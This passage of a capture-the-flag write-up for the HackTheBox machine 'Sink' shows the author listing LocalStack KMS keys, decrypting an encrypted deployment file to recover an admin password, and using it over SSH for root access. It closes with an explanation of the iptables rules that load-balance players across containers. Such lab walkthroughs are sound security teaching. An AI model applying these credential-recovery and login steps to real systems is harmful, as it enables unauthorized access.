            "KeyId": "53bb45ef-bf96-47b2-a423-74d9b89a297a",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a"
        },
        {
            "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0"
        },
        {
            "KeyId": "837a2f6e-e64c-45bc-a7aa-efa56a550401",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401"
        },
        {
            "KeyId": "881df7e3-fb6f-4c7b-9195-7f210e79e525",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525"
        },
        {
            "KeyId": "c5217c17-5675-42f7-a6ec-b5aa9b9dbbde",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"
        },
        {
            "KeyId": "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"
        },
        {
            "KeyId": "f2358fef-e813-4c59-87c8-70e50f6d4f70",
            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70"
        }
    ]
}

```

There’s another subcommand, `describe-key`, that takes `--key-id`:

```

david@sink:~$ awslocal kms describe-key --key-id 16754494-4333-4f77-ad4c-d0b73d799939
{
    "KeyMetadata": {
        "AWSAccountId": "000000000000",
        "KeyId": "16754494-4333-4f77-ad4c-d0b73d799939",
        "Arn": "arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939",
        "CreationDate": 1609757131,
        "Enabled": false,
        "Description": "Encryption and Decryption",
        "KeyUsage": "ENCRYPT_DECRYPT",
        "KeyState": "Disabled",
        "Origin": "AWS_KMS",
        "KeyManager": "CUSTOMER",
        "CustomerMasterKeySpec": "RSA_4096",
        "EncryptionAlgorithms": [
            "RSAES_OAEP_SHA_1",
            "RSAES_OAEP_SHA_256"
        ]
    }
}

```

Given that I’m looking to do some decryption, finding a key with usage `ENCRYPT_DECRYPT` would be useful. This one has `Enabled` set to `false`.

To check out each key, I’ll get a list using `grep` and `cut`:

```

david@sink:~$ awslocal kms list-keys | grep KeyId | cut -d'"' -f4
0b539917-5eff-45b2-9fa1-e13f0d2c42ac
16754494-4333-4f77-ad4c-d0b73d799939
2378914f-ea22-47af-8b0c-8252ef09cd5f
2bf9c582-eed7-482f-bfb6-2e4e7eb88b78
53bb45ef-bf96-47b2-a423-74d9b89a297a
804125db-bdf1-465a-a058-07fc87c0fad0
837a2f6e-e64c-45bc-a7aa-efa56a550401
881df7e3-fb6f-4c7b-9195-7f210e79e525
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde
f0579746-10c3-4fd1-b2ab-f312a5a0f3fc
f2358fef-e813-4c59-87c8-70e50f6d4f70

```

I’ll loop over those, storing the description and then looking for keys that are not `Disabled` and printing their usage. It finds two:

```

david@sink:~$ awslocal kms list-keys | grep KeyId | cut -d'"' -f4 | while read id; do desc=$(awslocal kms describe-key --key-id $id); use=$(echo $desc | cut -d'"' -f26); echo $desc | grep -q Disabled || echo "$id  $use"; done
804125db-bdf1-465a-a058-07fc87c0fad0  ENCRYPT_DECRYPT
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde  SIGN_VERIFY

```

### Decrypt

I’ll use the one that’s intended for `ENCRYPT_DECRYPT` and try to decrypt the blob. This key supports both SHA1 and SHA256 based RSAES:

```

david@sink:~$ awslocal kms describe-key --key-id 804125db-bdf1-465a-a058-07fc87c0fad0
{
    "KeyMetadata": {
        "AWSAccountId": "000000000000",
        "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
        "Arn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
        "CreationDate": 1609757999,
        "Enabled": true,
        "Description": "Encryption and Decryption",
        "KeyUsage": "ENCRYPT_DECRYPT",
        "KeyState": "Enabled",
        "Origin": "AWS_KMS",
        "KeyManager": "CUSTOMER",
        "CustomerMasterKeySpec": "RSA_4096",
        "EncryptionAlgorithms": [
            "RSAES_OAEP_SHA_1",
            "RSAES_OAEP_SHA_256"
        ]
    }
}

```

I’ll reference the file by the notation `fileb://[path]`, and pass it into the `decrypt` subcommand:

```

david@sink:~/Projects/Prod_Deployment$ awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --ciphertext-blob fileb://servers.enc 

An error occurred (InvalidCiphertextException) when calling the Decrypt operation: 

```

It doesn’t like it. If I specify the encryption, it works:

```

david@sink:~/Projects/Prod_Deployment$ awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --ciphertext-blob fileb://servers.enc --encryption-algorithm RSAES_OAEP_SHA_256
{
    "KeyId": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
    "Plaintext": "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=",
    "EncryptionAlgorithm": "RSAES_OAEP_SHA_256"
}

```

### Find Password

I’ll grab the base64-encoded blob, decode it, and output it to a file on my local machine:

```

oxdf@parrot$ echo "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=" | base64 -d > decrypted
oxdf@parrot$ file decrypted 
decrypted: gzip compressed data, from Unix, original size modulo 2^32 10240

```

It’s now gzipped data. I can `decompress` that with `zcat`, which makes a `tar` archive:

```

oxdf@parrot$ zcat decrypted > decrypted_decompressed
oxdf@parrot$ file decrypted_decompressed
decrypted_decompressed: POSIX tar archive (GNU)

```

Extracting that provides two files, and the `servers.yml` file is plaintext:

```

oxdf@parrot$ tar xvf decrypted_decompressed
servers.yml
servers.sig
oxdf@parrot$ cat servers.yml 
server:
  listenaddr: ""
  port: 80
  hosts:
    - certs.sink.htb
    - vault.sink.htb
defaultuser:
  name: admin
  pass: _uezduQ!EY5AHfe2

```

It contains an admin password.

### SSH

That password works over SSH for root:

```

oxdf@parrot$ sshpass -p '_uezduQ!EY5AHfe2' ssh root@10.10.10.225
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-53-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 25 Jan 2021 06:24:29 PM UTC

  System load:                      0.26
  Usage of /:                       44.1% of 19.56GB
  Memory usage:                     80%
  Swap usage:                       5%
  Processes:                        341
  Users logged in:                  1
  IPv4 address for br-85739d6e29c0: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.225
  IPv6 address for ens160:          dead:beef::250:56ff:feb4:83fe
 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

49 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable 

You have new mail.
Last login: Mon Jan 25 18:22:45 2021
root@sink:~#

```

And I can grab `root.txt`:

```

root@sink:~# cat root.txt
13fb0edc************************

```

## Beyond Root

Request smuggling was a really popular exploitation concept that I had heard about many times. [SerialPwny](https://twitter.com/SerialPwny) was regularly DMing me to talk about how he exploited it for some bug bounty. Yet I never really had a feel for how it worked. And then MrR3boot builds this beautifil that displayed the technique so clearly. I loved it.

Sink was to be released only a few weeks after I started working for HackTheBox. The challenge with Sink is that for request smuggling to work, the malicious packet needed to be followed immediately by the legit traffic to be captured. How would this work on shared instances at HackTheBox, where many hackers were trying to exploit the vulnerability at the same time, and he legit traffic was scripted to occur only periodically?

We took advantage of the fact that the vulnerable application was running in Docker, which meant we could scale it. Instead of starting one instance of the flask container, we started 16:

```

root@sink:~# docker ps
CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                                               NAMES
3d55d9da52f0        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6015->8080/tcp                           gifted_poincare
3a88a256bfea        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6014->8080/tcp                           wizardly_borg
43cf1c3e4113        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6013->8080/tcp                           magical_greider
ecccc85cc666        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6012->8080/tcp                           stupefied_goldstine
1bc3f322af05        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6011->8080/tcp                           great_shamir
4348cfb57a49        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6010->8080/tcp                           stupefied_satoshi
aacae3cf513b        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6009->8080/tcp                           infallible_taussig
ff0c84e62bfa        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6008->8080/tcp                           vigorous_mendeleev
a3308a3f1e59        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6007->8080/tcp                           elegant_ramanujan
2bc3df8be4ea        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6006->8080/tcp                           elated_jackson
874e4a1392a2        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6005->8080/tcp                           clever_torvalds
c8361846ea2c        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6004->8080/tcp                           charming_mendeleev
ed03a109bb55        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6003->8080/tcp                           frosty_sammet
07c9fe1b8aea        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6002->8080/tcp                           flamboyant_dijkstra
a3bb59be4ff6        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6001->8080/tcp                           practical_hellman
5e2c45dfa518        app                     "/usr/bin/supervisor…"   7 months ago        Up 8 minutes        172.17.0.1:6000->8080/tcp                           unruffled_lewin
ec0b4822129e        localstack/localstack   "docker-entrypoint.sh"   8 months ago        Up 8 minutes        4567-4597/tcp, 127.0.0.1:4566->4566/tcp, 8080/tcp   root_localstack_1

```

With 16 listening containers, we now wanted a way to load balance users across these instances. IppSec looked into a way to do it with a kernel module (which he talks about in his video for [Validation](https://www.youtube.com/watch?v=UqoVQ4dbYaI)), but we ended up going with a solution using IPtables. In `/root/automation`, there’s a `rules.sh` file which sets the rules on boot:

```

#!/bin/bash
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.0/0.0.0.15 -j  DNAT --to-destination 172.17.0.2:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.1/0.0.0.15 -j  DNAT --to-destination 172.17.0.3:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.2/0.0.0.15 -j  DNAT --to-destination 172.17.0.4:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.3/0.0.0.15 -j  DNAT --to-destination 172.17.0.5:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.4/0.0.0.15 -j  DNAT --to-destination 172.17.0.6:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.5/0.0.0.15 -j  DNAT --to-destination 172.17.0.7:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.6/0.0.0.15 -j  DNAT --to-destination 172.17.0.8:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.7/0.0.0.15 -j  DNAT --to-destination 172.17.0.9:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.8/0.0.0.15 -j  DNAT --to-destination 172.17.0.10:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.9/0.0.0.15 -j  DNAT --to-destination 172.17.0.11:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.10/0.0.0.15 -j  DNAT --to-destination 172.17.0.12:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.11/0.0.0.15 -j  DNAT --to-destination 172.17.0.13:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.12/0.0.0.15 -j  DNAT --to-destination 172.17.0.14:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.13/0.0.0.15 -j  DNAT --to-destination 172.17.0.15:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.14/0.0.0.15 -j  DNAT --to-destination 172.17.0.16:8080
/usr/sbin/iptables -A PREROUTING -t nat -p tcp -d 0.0.0.0/0 --dport 5000 -s 0.0.0.15/0.0.0.15 -j  DNAT --to-destination 172.17.0.17:8080

```

For each rule, it’s matching on a destination port of 5000. For a given IP, it will use a mask of `0.0.0.15`. 15 is 1111 in binary, so it’s look at the low four bits of the source IP, and comparing that to the defined value. So `0.0.0.4/0.0.0.15` would match on a .4, .20, .26, etc. With 16 rules, each IP is covered by only one of them. Each rule will do a NAT rewrite to forward you to one of the containers.

Effectively, this means for a given instance of sink, 1/16 of the players are targeting each container.